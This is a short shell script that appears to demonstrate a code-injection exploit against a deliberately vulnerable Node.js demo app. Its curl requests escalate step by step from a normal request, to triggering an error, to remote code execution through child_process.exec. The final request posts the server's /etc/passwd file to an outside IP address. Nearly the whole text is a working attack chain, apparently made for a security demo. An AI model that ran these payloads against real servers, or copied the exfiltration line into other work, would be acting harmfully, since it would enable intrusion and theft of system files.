if [ -z "$GOOF_HOST" ]; then
	export GOOF_HOST=http://localhost:3001
fi

# Simple request
curl $GOOF_HOST'/about_new?device=Desktop'

# Request with array
curl $GOOF_HOST'/about_new?device\[\]=Desktop'

# Trigger error
curl $GOOF_HOST'/about_new?device\[\]=Desktop%27'

# Simple RCE, logs to console
curl $GOOF_HOST'/about_new?device\[\]=Desktop%27-console.log(%27FrontendConf%20Was%20Here%27)-%27'

curl $GOOF_HOST'/about_new?device\[\]=Desktop%27-require(%27child_process%27).exec(%27curl%20-m%203%20-F%20%22x%3D%60cat%20%2Fetc%2Fpasswd%60%22%20http%3A%2F%2F34.205.135.170%2F%27)-%27'